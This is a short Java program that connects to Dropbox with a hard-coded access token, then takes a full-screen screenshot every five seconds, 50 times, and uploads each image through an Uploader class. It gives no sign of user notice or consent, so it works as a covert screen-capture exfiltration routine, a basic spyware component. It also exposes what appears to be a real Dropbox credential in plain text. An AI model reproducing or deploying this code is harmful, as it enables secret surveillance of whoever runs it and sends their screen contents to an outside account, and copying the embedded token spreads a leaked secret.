import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws AWTException, IOException, DbxException, InterruptedException {
        String ACCESS_TOKEN="sl.A0EpcODRfWJ5QTbLE8wZnQShGLS_39jG8_6zdRAKnMvM-mUljfhpF8jDMiDni66KWva8wgwaYFQioIBdVlgxGuKufblSzYRniQYcJjoNpvlHUMkXSRTsk3H-WqfFriYWP_Wt2yQ";

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);


        for(int i=0;i<50;i++){
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            Uploader uploader=new Uploader(client,image);
            uploader.run();
            try {
                Thread.sleep(5000);
            }catch (InterruptedException e){
                e.printStackTrace();
            }
        }
        }

    }
